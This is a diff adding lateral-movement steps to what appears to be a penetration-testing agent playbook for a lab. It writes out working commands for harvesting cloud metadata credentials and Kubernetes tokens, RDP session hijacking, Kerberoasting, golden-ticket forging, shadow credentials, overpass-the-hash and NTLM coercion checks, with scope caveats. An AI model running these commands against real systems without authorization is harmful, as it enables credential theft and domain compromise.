@@ -125,6 +125,77 @@ run_tool nmap -Pn -sT -p 22,23,80,443,872,9090,5060,5061 --max-hosts 10 --host-t
 
 Use the existing local-forward, SOCKS, or confirmed server-side request primitive for the two probe URLs; `HOST` and `PORT` identify the selected in-scope loopback or app-server endpoint. The two loopback requests are the only endpoint probes, and the explicit host list is the only internal enumeration. If any candidate lacks in-scope evidence, record it as out of scope and do not connect.
 
+### 9. Cloud Credential and Metadata Reuse
+
+When a foothold holds cloud instance-profile credentials, service-account tokens, or a Kubernetes service-account JWT, treat them as a lateral edge into the cloud control plane, not just the host. Validate scope before using the credential against any other resource.
+
+```bash
+run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -X PUT http://169.254.169.254/latest/api/token -o "$DIR/scans/imds-token.txt"
+run_tool curl -sS --connect-timeout 5 --max-time 20 -H "X-aws-ec2-metadata-token: $(cat "$DIR/scans/imds-token.txt")" http://169.254.169.254/latest/meta-data/iam/security-credentials/
+run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
+run_tool cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
+run_tool curl -sS -k --connect-timeout 5 --max-time 20 -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)" https://kubernetes.default.svc/api/v1/namespaces/default/pods
+```
+
+Record the credential's actual permission scope (via a harmless `GetCallerIdentity`/`whoami`-equivalent call) before treating it as a usable edge; an instance profile with only read-only S3 access is not a lateral edge to EC2 or IAM.
+
+### 10. RDP Session Hijack and WinRM Double-Hop
+
+On a host with `SeTcbPrivilege`/SYSTEM context, an existing disconnected RDP session under another user is a lateral/privilege edge without a password. Separately, when a first-hop WinRM session needs to reach a second-hop resource, plain WinRM cannot forward the Kerberos ticket (the "double hop" problem) — record whether CredSSP, a registered PSSession credential, or a delegated ticket is required instead of assuming the first hop's identity travels automatically.
+
+```bash
+run_tool nxc smb HOST -u USER -p PASS -x 'query session'
+run_tool nxc smb HOST -u USER -p PASS -x 'tscon SESSION_ID /dest:RDP-tcp#SESSION_NAME' # record only; requires SYSTEM, do not execute without explicit exploit-developer ownership
+run_tool nxc winrm HOST -u USER -p PASS -x 'whoami /groups' # check for CredSSP-delegated vs. network-logon token
+```
+
+### 11. SSH Agent and Certificate-Authority Trust Reuse
+
+If the foothold has a forwarded SSH agent socket or a host/user SSH-CA trust relationship, that is a movement edge distinct from a static key file.
+
+```bash
+run_tool sh -lc 'printf "%s\n" "$SSH_AUTH_SOCK"; ssh-add -l 2>/dev/null'
+run_tool find / -xdev -name '*-cert.pub' -o -name 'ssh_known_hosts' 2>/dev/null
+run_tool grep -R -n 'TrustedUserCAKeys\|@cert-authority' /etc/ssh 2>/dev/null
+```
+
+An accessible agent socket lets any process on the host request a signature without ever reading the private key — record which hosts accept the agent's identities before treating this as a completed pivot.
+
+### 12. Kerberos Ticket Attacks: Roasting, Forging, and Shadow Credentials
+Beyond the ticket-form checks in step 3, map the specific Kerberos abuse primitives separately since each has a different prerequisite and evidence class. Kerberoasting needs only a valid domain account and a service with an SPN; AS-REP roasting needs an account with `DONT_REQ_PREAUTH` set; golden/silver ticket forging needs the krbtgt hash or a service account hash respectively (obtained via `secretsdump` in step 3, not re-derived here); shadow-credential attacks need `GenericWrite`/`msDS-KeyCredentialLink` write access on a target object.
+
+```bash
+run_tool impacket-GetUserSPNs DOMAIN/USER:PASS@DC -outputfile "$DIR/scans/kerberoast.txt"
+run_tool impacket-GetNPUsers DOMAIN/ -usersfile "$DIR/scans/candidate-users.txt" -outputfile "$DIR/scans/asrep.txt" -no-pass
+run_tool impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN USER -outputfile "$DIR/scans/golden.ccache" # record only; requires krbtgt hash from an already-owned DC
+run_tool certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET_ACCOUNT # msDS-KeyCredentialLink write-based shadow credential
+```
+
+Record which prerequisite (SPN presence, `DONT_REQ_PREAUTH`, krbtgt/service hash possession, or `GenericWrite` on `msDS-KeyCredentialLink`) is actually confirmed before treating a ticket-forging path as usable; offline hash cracking and ticket injection remain exploit-developer-owned.
+
+### 13. NTLM Relay Chaining and Overpass-the-Hash
+Distinguish a raw pass-the-hash (step 3) from an NTLM relay chain, which requires an active coercion or listener rather than a static credential, and from overpass-the-hash, which converts an NTLM hash into a usable Kerberos TGT without ever touching NTLM authentication on the target service.
+
+```bash
+run_tool nmap -p 445 --script smb2-security-mode HOST # signing not required = relay candidate
+run_tool impacket-getST -hashes :HASH DOMAIN/USER -spn 'cifs/target.domain' DC # overpass-the-hash: NTLM hash -> Kerberos service ticket
+run_tool nxc smb HOST -u USER -p PASS -M coerce_plus 2>/dev/null # record coercion primitive presence only
+```
+
+Record whether SMB signing is disabled on the relay target (a hard prerequisite `nmap` can confirm without touching credentials) and which coercion primitive (PetitPotam/PrinterBug-style) is present; the actual relay listener and coercion trigger belong to exploit-developer.
+
+### 14. WMI Event Subscription and WinRM Session Reuse
+Beyond one-shot WMI/WinRM execution (step 2), a WMI permanent event subscription or a saved/registered PSSession credential is a durable lateral primitive distinct from a single command. Enumerate existing subscriptions and registered session configurations before assuming only interactive execution is available.
+
+```bash
+run_tool nxc wmi HOST -u USER -p PASS -x 'whoami'
+run_tool nxc smb HOST -u USER -p PASS -x 'powershell -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter"'
+run_tool nxc smb HOST -u USER -p PASS -x 'powershell -NoProfile -Command "Get-PSSessionConfiguration"'
+run_tool nxc smb HOST -u USER -p PASS -x 'winrs -r:HOST whoami' # winrs as an alternate WinRM client, different auth negotiation path than nxc
+```
+
+An existing WMI event subscription bound to a privileged account or a registered PSSession credential is a pre-established movement edge; record its owner and trigger condition rather than creating a new subscription.
+
 ### Lab objective recall closure
 
 When the active profile lists a movement objective, requeue the exact AD path, remote transport, share staging, or tunnel workflow that already produced an edge, save one bounded result under `$DIR/scans/`, and run `python3 ./scripts/lab_objective.py snapshot "$DIR"`. Hand off `objective=<name> status=solved|requeued evidence=<path> next=<exact action>`; do not call an open port or share listing solved movement.
